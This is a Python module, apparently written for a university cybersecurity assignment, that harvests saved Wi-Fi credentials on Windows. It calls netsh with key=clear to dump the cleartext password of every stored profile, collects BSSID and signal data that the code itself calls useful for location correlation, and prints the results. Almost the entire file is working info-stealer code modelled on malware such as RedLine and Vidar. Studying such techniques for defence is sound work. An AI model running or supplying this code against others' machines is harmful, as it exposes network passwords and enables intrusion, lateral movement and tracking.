"""
Wi-Fi Password Extraction Module
MITRE ATT&CK: T1552.001 (Unsecured Credentials: Credentials In Files)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Extracts saved Wi-Fi passwords from Windows using netsh.
Windows stores Wi-Fi profiles in XML under ProgramData — the cleartext
key is available to any user via 'netsh wlan show profile key=clear'.

Real-world usage: Info-stealers (RedLine, Raccoon, Vidar) all harvest
Wi-Fi credentials to map networks and pivot to other devices.
"""

import subprocess
import re


def get_wifi_passwords():
    """
    Extract all saved Wi-Fi profile names and their cleartext passwords.

    How it works:
      1. 'netsh wlan show profiles' → list of saved SSIDs
      2. For each SSID, 'netsh wlan show profile name=X key=clear' → password

    Returns:
        list of dicts: [{ssid, password, auth, cipher, security}]
    """
    results = []

    # Step 1: Get all saved Wi-Fi profile names
    try:
        output = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True, timeout=10
        )
        profiles = re.findall(r"All User Profile\s*:\s*(.+)", output.stdout)
        profiles = [p.strip() for p in profiles if p.strip()]
    except Exception:
        return []

    # Step 2: For each profile, extract the cleartext key
    for ssid in profiles:
        entry = {"ssid": ssid, "password": None, "auth": None, "cipher": None, "security": None}

        try:
            detail = subprocess.run(
                ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
                capture_output=True, text=True, timeout=10
            )
            text = detail.stdout

            # Extract key content (password)
            key_match = re.search(r"Key Content\s*:\s*(.+)", text)
            if key_match:
                entry["password"] = key_match.group(1).strip()

            # Extract authentication type (WPA2-Personal, WPA3, Open, etc.)
            auth_match = re.search(r"Authentication\s*:\s*(.+)", text)
            if auth_match:
                entry["auth"] = auth_match.group(1).strip()

            # Extract cipher (CCMP, TKIP, etc.)
            cipher_match = re.search(r"Cipher\s*:\s*(.+)", text)
            if cipher_match:
                entry["cipher"] = cipher_match.group(1).strip()

            # Extract security type
            sec_match = re.search(r"Security key\s*:\s*(.+)", text)
            if sec_match:
                entry["security"] = sec_match.group(1).strip()

        except Exception:
            pass

        results.append(entry)

    return results


def get_wifi_interfaces():
    """
    Get details about wireless interfaces (BSSID, signal, channel).
    Useful for physical location correlation.

    Returns:
        dict with interface details
    """
    try:
        output = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True, timeout=10
        )
        text = output.stdout
        info = {}

        patterns = {
            "name": r"Name\s*:\s*(.+)",
            "state": r"State\s*:\s*(.+)",
            "ssid": r"SSID\s*:\s*(.+)",
            "bssid": r"BSSID\s*:\s*(.+)",
            "channel": r"Channel\s*:\s*(.+)",
            "signal": r"Signal\s*:\s*(.+)",
            "radio_type": r"Radio type\s*:\s*(.+)",
            "receive_rate": r"Receive rate\s*:\s*(.+)",
            "transmit_rate": r"Transmit rate\s*:\s*(.+)",
        }

        for field, pattern in patterns.items():
            match = re.search(pattern, text)
            if match:
                info[field] = match.group(1).strip()

        return info

    except Exception:
        return {}


if __name__ == "__main__":
    print("=" * 50)
    print("  Wi-Fi Password Extraction Test")
    print("  T1552.001 - Credentials In Files")
    print("=" * 50)

    # Current interface
    iface = get_wifi_interfaces()
    if iface:
        print(f"\n[*] Current connection:")
        print(f"    SSID: {iface.get('ssid', 'N/A')}")
        print(f"    BSSID: {iface.get('bssid', 'N/A')}")
        print(f"    Signal: {iface.get('signal', 'N/A')}")
        print(f"    Channel: {iface.get('channel', 'N/A')}")

    # All saved passwords
    passwords = get_wifi_passwords()
    if passwords:
        print(f"\n[+] Found {len(passwords)} saved Wi-Fi profiles:\n")
        for entry in passwords:
            pw = entry['password'] or '(open/no password)'
            auth = entry['auth'] or 'unknown'
            print(f"    SSID: {entry['ssid']}")
            print(f"    Password: {pw}")
            print(f"    Auth: {auth}")
            print()
    else:
        print("\n[-] No Wi-Fi profiles found")
